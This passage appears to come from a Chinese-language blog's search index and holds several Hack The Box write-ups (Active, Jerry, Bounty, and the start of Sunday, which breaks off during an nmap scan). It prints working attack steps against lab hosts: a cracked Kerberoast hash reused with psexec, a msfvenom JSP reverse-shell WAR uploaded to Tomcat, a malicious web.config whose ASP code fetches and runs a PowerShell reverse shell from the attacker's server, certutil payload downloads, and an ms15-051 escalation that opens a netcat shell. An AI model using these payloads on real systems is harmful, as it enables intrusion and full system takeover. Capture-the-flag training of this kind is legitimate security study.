Skipping...\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$65399e5d81a676e87013d1d2c95a9919$831e286d069ed4766f092217ea7ed3e87d62dd0d864b137ef449c0fe02bd6d418c6ea56c01254956638d0b0e6f9868bab37574dc0bdc29f47106d8d4f96d9f87ceb62920f566339adfc5ec5d2761a97a7843be5b750a38b8f0aa42f67b3c1dd909fa1832796d43b2be9830c78450c46802a3c266a0000d0c898b003edbe894fc11e4746382b5a422e04fa23096c50d3330fa9bcae382771bcc528c090c245327d968f1bb06f345dc2d44cf92624eea731e7467f5a6dfb6c90d016bc716de3ba2128a428e7d0b4529dcad6a4d59b1780f7ef863580a1e56348eb12cb865e21c5ce047d289762b0c2ae694db3ffed75416c9cda974a3e4ca591cf25288a0278d4ff4e971013e74c5dcb2321e6b228de3617ed8f53705443dfa858d732f39df31d153ea5dfed178961933883613c692856a381c68f00a7821f77682b9d303a0c7e9af9f24cb6de1ccb5a1d74b7de0d3952669f4ea1d730a5cfabe52a970a6d38013934bea4cc175c2cdcb0da52087fb5599a769e8f50c90535c46e28a081791eb56377d67eb9b8334e89c15c25268ad9af9cea1b4d44cbd3eb5c5d431bab1aabe922fa75af954ec75b024351dd1d22a2df3d2d9f968d191fd456062f22e11c6af3d64ca9ee0bae77f933e5e1879f9f45b50e88a6de5278fffcdc20a99fde8e6e305b3bb213584d5c047df73f432386500dde52cfc1fc277399979a8b5955008aad50cbcfa359ddd6d634b99064663a49a2f477b4d2d8d21ffd8fdf9ccc43b10db9b58964e198444881f96ce700c9dc6cb6c4192274cd7e52c7340f2c052909a9bc78e6dee1b7758f07ac32154d3f4fd01fa776520c514de5e6c3ba53ea0b2c81d9e8c1d0124b3467610038423bd14dbdbc863ddc9d0dfd8d768a3682ee7da66d38c3e7d31937c1eb5813d4997377649be0b14487de5cf23be190c7f20cec1f47afa101829fbf3e12320481ca79f6254e2462dadae248020ed5b0bfff84367f33f101f734ff5727eaa101a4faaeadf267d20b3211583d7794c0892a62b6dc25caafc96c17f21ef1585aa6b95b89aa831a22959e145b490364aa28c42ea79763a1db3ef5159558e6898faaf40e5757e3d7889308ec79ae1d2d721ea98b2e79914d85380c4385d62ee308caa77982c84eaaccc84b19cc69d16b4ae471b270b66c02b16f450c109e58cd5e524d20b092c62ce573115d204825121da3913418a596157b6274c3ac653d352f10983b08046de6e3ab6715169dbf250bf0212\n```\n把这段 hash 保存下来，然后使用 hashcat 进行爆破\n\n```bash\nhashcat hash /usr/share/wordlists/rockyou.txt -m 13100\n\nTicketmaster1968\n```\n```bash\n┌──(root💀kali)-[~/Desktop/impacket/examples]\n└─# python3 psexec.py Administrator:Ticketmaster1968@10.10.10.100                                                                                                                                               1 ⚙\nImpacket v0.9.25.dev1+20220420.234604.17ae0913 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 10.10.10.100.....\n[*] Found writable share ADMIN$\n[*] Uploading file CahMAAGa.exe\n[*] Opening SVCManager on 10.10.10.100.....\n[*] Creating service jzgq on 10.10.10.100.....\n[*] Starting service jzgq.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n```\n成功拿到 root 权限的 shell\n\n```bash\nc:\\Users\\Administrator\\Desktop> type root.txt\nd7a6880e1ed8648dcb9012f911819322\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Jerry - Hackthebox","url":"/2022/04/23/Hackthebox/Easy/Hackthebox-Jerry/","content":"\n# Hackthebox - Jerry\n# 靶场信息\n![](Hackthebox-Jerry/2aa66885-a270-42fe-81ab-1425ffc6498f.png)\n\n# 靶场类型\n![](Hackthebox-Jerry/5f0e0886-3443-4e59-8bf0-369576652f23.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.95          \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-22 02:03 EDT\nNmap scan report for 10.10.10.95\nHost is up (0.33s latency).\nNot shown: 65534 filtered ports\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_http-favicon: Apache Tomcat\n|_http-server-header: Apache-Coyote/1.1\n|_http-title: Apache Tomcat/7.0.88\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2012|2008|Vista|7 (91%)\nOS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7\nAggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 7 Professional (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT       ADDRESS\n1   333.58 ms 10.10.14.1\n2   334.33 ms 10.10.10.95\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 61.70 seconds\n```\n## Http\n这里只有一个 8080 端口，去访问一下看看\n\n![](Hackthebox-Jerry/6e5141f4-3c25-4560-917f-a9ad84a2b6be.png)\n\n是一个 tomcat 的页面，尝试一下弱口令登录\n\n# 漏洞利用\n![](Hackthebox-Jerry/ba3b45d7-9918-411e-bdd0-9d07e0d23436.png)\n\n使用弱口令 admin/admin 成功登录，但是这里却没有看到上传点，我怀疑不太对，因为tomcat 的 登录密码一般是 tomcat\n\n![](Hackthebox-Jerry/6923f155-801f-42f9-bb64-22048fc65505.png)\n\n在输入密码的时候选择取消，然后在错误页面中得到了一个账号密码\n\n```bash\nusername = tomcat\npassword = s3cret\n```\n![](Hackthebox-Jerry/a7ec9f00-77ad-43c0-b5d6-f7c054dcc97e.png)\n\n这次权限就对了，然后使用 msfvenom 去生成一个 war 马\n\n```bash\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > shell.war\n```\n然后使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n![](Hackthebox-Jerry/75fbd76d-9f12-4218-be6b-5f60529d325a.png)\n\n上传后去访问一下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.95] 49193\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\apache-tomcat-7.0.88>whoami\nwhoami\nnt authority\\system\n```\n成功拿到一个 shell\n\n```bash\nc:\\Users\\Administrator\\Desktop\\flags>type \"2 for the price of 1.txt\"\ntype \"2 for the price of 1.txt\"\nuser.txt\n7004dbcef0f854e0fb401875f26ebd00\n\nroot.txt\n04a8b36e1545a455393d067e772fe90e\n```\n拿到 user 和 root 权限的 flag 文件，倒是不用提权了","tags":["Hackthebox"]},{"title":"Bounty - Hackthebox","url":"/2022/04/22/Hackthebox/Easy/Hackthebox-Bounty/","content":"\n# Hackthebox - Bounty\n# 靶场信息\n![](Hackthebox-Bounty/a0ae619a-9c2b-42ed-90e6-4145a10d9e36.png)\n\n# 靶场类型\n![](Hackthebox-Bounty/c568cfcf-ae66-4c3a-b7cf-08f38c9feeab.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀lucifiel)-[~]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.93\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-20 16:39 CST\nNmap scan report for 10.10.10.93\nHost is up (0.38s latency).\nNot shown: 65534 filtered ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 7.5\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: Bounty\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)\nOS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012\nAggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   342.38 ms 10.10.16.1\n2   513.76 ms 10.10.10.93\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 57.51 seconds\n```\n## Http\n![](Hackthebox-Bounty/ecef5259-e729-4bd4-9c09-34791d0dd6f0.png)\n\nhttp 里也没什么东西，去 fuzz 一下看看\n\n## Fuzz\n```bash\n┌──(root💀lucifiel)-[~]\n└─# gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.93/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/20 16:44:18 Starting gobuster in directory enumeration mode\n===============================================================\n/UploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/UploadedFiles/]\n\n===============================================================\n2022/04/20 16:47:53 Finished\n===============================================================\n```\n有一个目录，访问一下\n\n![](Hackthebox-Bounty/d1eb8957-4107-4be7-aa48-9b21dcb3d71d.png)\n\n403 了，通过 nmap 得知这是 windows 系统下的 iis 搭建的网站，让我们尝试一下用 -x 扫描 aspx 格式的网页\n\n```bash\n┌──(root💀lucifiel)-[~]\n└─# gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 --no-error -x aspx\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.93/\n[+] Method:                  GET\n[+] Threads:                 500\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              aspx\n[+] Timeout:                 10s\n===============================================================\n2022/04/20 16:57:38 Starting gobuster in directory enumeration mode\n===============================================================\n/transfer.aspx        (Status: 200) [Size: 941]\n\n===============================================================\n2022/04/20 16:59:36 Finished\n===============================================================\n```\n![](Hackthebox-Bounty/b855bbeb-2c65-49c6-a002-ff20fd7c2542.png)\n\n我们扫描到一个文件上传的页面\n\n随便上传张图片试试看\n\n![](Hackthebox-Bounty/0f58a9af-1dee-4df9-bbf4-42f209000f77.png)\n\n这里显示上传成功，去访问一下看看能不能访问到\n\n![](Hackthebox-Bounty/f5bf4d16-3a3d-4a67-951f-c2a79d93233e.png)\n\n可以访问到，但是大概一分钟左右就会被自动删除\n\n![](Hackthebox-Bounty/3ffe6028-8d90-4e87-8664-d979a5799b34.png)\n\n尝试上传了一个aspx文件，这次上传失败了\n\n去搜了一下相关的漏洞，倒是搜到了一些漏洞\n\n![](Hackthebox-Bounty/1b35566e-f9f1-4ad7-b16b-96c0c1bac2f8.png)\n\n> [https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/)\n\n去利用吧\n\n# 漏洞利用\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n   <system.webServer>\n      <handlers accessPolicy=\"Read, Script, Write\">\n         <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" />         \n      </handlers>\n      <security>\n         <requestFiltering>\n            <fileExtensions>\n               <remove fileExtension=\".config\" />\n            </fileExtensions>\n            <hiddenSegments>\n               <remove segment=\"web.config\" />\n            </hiddenSegments>\n         </requestFiltering>\n      </security>\n   </system.webServer>\n</configuration>\n<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!\n<%\nResponse.write(\"-\"&\"->\")\n' it is running the ASP code if you can see 3 by opening the web.config file!\nResponse.write(1+2)\nResponse.write(\"<!-\"&\"-\")\n%>\n-->\n```\n将这段文件代码保存为 web.config 然后上传，去查看后如果看到了 “3” 则表示 payload 被执行了\n\n![](Hackthebox-Bounty/124031ef-b2c4-4220-963f-82c6a27c1446.png)\n\n确实执行成功了\n\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n   <system.webServer>\n      <handlers accessPolicy=\"Read, Script, Write\">\n         <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" />         \n      </handlers>\n      <security>\n         <requestFiltering>\n            <fileExtensions>\n               <remove fileExtension=\".config\" />\n            </fileExtensions>\n            <hiddenSegments>\n               <remove segment=\"web.config\" />\n            </hiddenSegments>\n         </requestFiltering>\n      </security>\n   </system.webServer>\n</configuration>\n<!-- \n<%\nSet rs = CreateObject(\"WScript.Shell\")\nSet cmd = rs.Exec(\"cmd /c whoami\")\no = cmd.StdOut.readall()\nResponse.write(o)\n%>\n-->\n```\n修改一个 POC，然后上传\n\n![](Hackthebox-Bounty/6d4a1396-e4a5-485c-9641-8363fe689610.png)\n\n这里成功返回了我们要的东西\n\n来明确一下攻击路径\n\n## Step 1\n使用 nishang 来进行 getshell\n\n> [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)\n\n然后在最后一行加入下面的代码\n\n```bash\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444\n```\n## Step 2\n然后构造好 web.config 中的语句\n\n```bash\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n   <system.webServer>\n      <handlers accessPolicy=\"Read, Script, Write\">\n         <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" />         \n      </handlers>\n      <security>\n         <requestFiltering>\n            <fileExtensions>\n               <remove fileExtension=\".config\" />\n            </fileExtensions>\n            <hiddenSegments>\n               <remove segment=\"web.config\" />\n            </hiddenSegments>\n         </requestFiltering>\n      </security>\n   </system.webServer>\n</configuration>\n<!-- \n<%\nSet rs = CreateObject(\"WScript.Shell\")\nSet cmd = rs.Exec(\"cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/Invoke-PowerShellTcp.ps1')\")\no = cmd.StdOut.readall()\nResponse.write(o)\n%>\n-->\n```\n然后使用 nc 在本地监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n接着使用 python3 开启一个 http 服务\n\n```bash\npython3 -m http.server 80\n```\n## Step 3\n上传并访问我们的 payload\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.93] 49158\nWindows PowerShell running as user BOUNTY$ on BOUNTY\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\windows\\system32\\inetsrv>whoami\nbounty\\merlin\n```\n成功拿到一个 shell\n\n# 权限提升\n使用 systeminfo 查看一下系统信息\n\n```bash\nPS C:\\windows\\system32\\inetsrv> systeminfo\n\nHost Name:                 BOUNTY                                                                                                                                                                                   \nOS Name:                   Microsoft Windows Server 2008 R2 Datacenter                                                                                                                                              \nOS Version:                6.1.7600 N/A Build 7600                                                                                                                                                                  \nOS Manufacturer:           Microsoft Corporation                                                                                                                                                                    \nOS Configuration:          Standalone Server                                                                                                                                                                        \nOS Build Type:             Multiprocessor Free                                                                                                                                                                      \nRegistered Owner:          Windows User                                                                                                                                                                             \nRegistered Organization:                                                                                                                                                                                            \nProduct ID:                55041-402-3606965-84760                                                                                                                                                                  \nOriginal Install Date:     5/30/2018, 12:22:24 AM                                                                                                                                                                   \nSystem Boot Time:          4/22/2022, 6:08:06 AM                                                                                                                                                                    \nSystem Manufacturer:       VMware, Inc.                                                                                                                                                                             \nSystem Model:              VMware Virtual Platform                                                                                                                                                                  \nSystem Type:               x64-based PC                                                                                                                                                                             \nProcessor(s):              1 Processor(s) Installed.                                                                                                                                                                \n                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz                                                                                                                         \nBIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018                                                                                                                                                \nWindows Directory:         C:\\Windows                                                                                                                                                                               \nSystem Directory:          C:\\Windows\\system32                                                                                                                                                                      \nBoot Device:               \\Device\\HarddiskVolume1                                                                                                                                                                  \nSystem Locale:             en-us;English (United States)                                                                                                                                                            \nInput Locale:              en-us;English (United States)\nTime Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul\nTotal Physical Memory:     2,047 MB\nAvailable Physical Memory: 28 MB\nVirtual Memory: Max Size:  4,095 MB\nVirtual Memory: Available: 1,786 MB\nVirtual Memory: In Use:    2,309 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    WORKGROUP\nLogon Server:              N/A\nHotfix(s):                 N/A\nNetwork Card(s):           1 NIC(s) Installed.\n                           [01]: Intel(R) PRO/1000 MT Network Connection\n                                 Connection Name: Local Area Connection\n                                 DHCP Enabled:    No\n                                 IP address(es)\n                                 [01]: 10.10.10.93\n```\n没有补丁，那就直接 ms15-051 提权了\n\n> [https://github.com/wikiZ/ms15--051](https://github.com/wikiZ/ms15--051)\n\n> [https://github.com/vinsworldcom/NetCat64/releases/tag/1.11.6.4](https://github.com/vinsworldcom/NetCat64/releases/tag/1.11.6.4)\n\n这里的 shell 不太稳定，咱们先使用 msf 获取一个 shell 吧\n\n然后咱们使用 shell 执行下面两条命令\n\n```bash\ncd c:\\users\\merlin\\desktop\ncertutil -urlcache -split -f http://10.10.14.2/ms15-051.exe\ncertutil -urlcache -split -f http://10.10.14.2/nc64.exe\n./ms15-051.exe \"./nc64.exe 10.10.14.2 5555 -e cmd.exe\"\n```\n然后使用 msf 开启监听\n\n```bash\nuse exploit/multi/handler\nset lhost 10.10.14.2\nexploit\n```\n然后执行文件\n\n```bash\n&\"C:\\users\\merlin\\Desktop\\shell.exe\"\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444                                                                       1 ⨯\nlistening on [any] 4444 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.93] 49181\nWindows PowerShell running as user BOUNTY$ on BOUNTY\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32>whoami\nnt authority\\system\n```\n成功得到 root 权限的 shell\n\n```bash\nPS C:\\Windows\\system32> type c:/users/merlin/desktop/user.txt   \n66aee8a564d37a25796466f0699d7e8a\nPS C:\\Windows\\system32> type c://users/administrator/desktop/root.txt\na376f4044a2bd073ed0abf33f3b659f4\n```\n成功得到 user 和 root 权限的 flag 文件\n\n# 其他\n如果 ms15-051 一直卡顿，那可以试试 juicy-potato\n\n> [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)","tags":["Hackthebox"]},{"title":"Sunday - Hackthebox","url":"/2022/04/19/Hackthebox/Easy/Hackthebox-Sunday/","content":"\n# Hackthebox - Sunday\n# 靶场信息\n![](Hackthebox-Sunday/50bf0a85-b184-47ac-96d1-c797e6e75126.png)\n\n# 靶场类型\n![](Hackthebox-Sunday/77b290ae-9d48-48b2-bb74-e9f9fb44fb7e.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀lucifiel)-[/home/lucifiel]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.76\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-14 12:51 CST\nWarning: 10.10.10.76 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.76\nHost is up (0.14s latency).\nNot shown: 59990 filtered ports, 5540 closed ports\nPORT      STATE SERVICE  VERSION\n79/tcp    open  finger?\n|_finger: No one logged on\\x0D\n| fingerprint-strings:\n|   GenericLines:\n|     No one logged on\n|   GetRequest:\n|     Login Name TTY Idle When Where\n|     HTTP/1.0 ???\n|   HTTPOptions:\n|     Login Name TTY Idle When Where\n|     HTTP/1.0 ???\n|     OPTIONS ???\n|   Help:\n|     Login Name TTY Idle When Where\n|     HELP ???\n|   RTSPRequest:\n|     Login Name TTY Idle When Where\n|     OPTIONS ???\n|     RTSP/1.0 ???\n|   SSLSessionReq, TerminalServerCookie:\n|_    Login Name TTY Idle When Where\n111/tcp   open  rpcbind  2-4 (RPC #100000)\n515/tcp   open  printer?\n6787/tcp  open  ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)\n|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14\n| http-title: Solaris Dashboard\n|_Requested resource was https://10.10.10.76:6787/solaris/\n| ssl-cert: Subject: commonName=sunday\n| Subject Alternative Name: DNS:sunday\n| Not valid before: 2021-12-08T19:40:00\n|_Not valid after:  2031-12-06T19:40:00\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|_  http/1.1\n22022/tcp open  ssh      OpenSSH 7.5 (protocol 2.0)\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port79-TCP:V=7.91%I=7%D=4/14%Time=6257A8F1%P=x86_64-pc-linux-gnu%r(Gene\nSF:ricLines,12,\"No\\x20one\\x20logged\\x20on\\r\\n\")%r(GetRequest,93,\"Login\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x2\nSF:0\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nGET\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\\nSF:?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:?\\?\\?\\r\\n\")%r(Help,5D,\"Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\nHELP\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\?\\?\\?\\r\\n\")%r(HTTPOptions,93,\"Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\\nSF:r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\")%r(RTSPRequest,93,\"Login\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x2\nSF:0When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nRTSP/1\\.0\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\")%r(SS\nSF:LSessionReq,5D,\"Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n\\x16\\x03\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\?\\?\\?\\r\\n\")%r(TerminalServerCookie,5D,\"Login\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\nSF:\\x20\\x20Where\\r\\n\\x03\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/14%OT=79%CT=5%CU=31867%PV=Y%DS=2%DC=T%G=Y%TM=6257AA5\nOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=\nOS:7)OPS(O1=ST11M505NW2%O2=ST11M505NW2%O3=NNT11M505NW2%O4=ST11M505NW2%O5=ST\nOS:11M505NW2%O6=ST11M505)WIN(W1=FB1E%W2=FB1E%W3=FA38%W4=FA3B%W5=FA3B%W6=FFF\nOS:7)ECN(R=Y%DF=Y%T=3C%W=FAFA%O=M505NNSNW2%CC=Y%Q=)T1(R=Y%DF=Y%T=3C%S=O%A=S\nOS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=3C%W=FA09%S=O%A=S+%F=AS%O=ST11M505NW\nOS:2%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\nOS:T7(R=N)U1(R=Y%DF=N%T=FF%IPL=70%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE\nOS:(R=Y%DFI=Y%T=FF%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 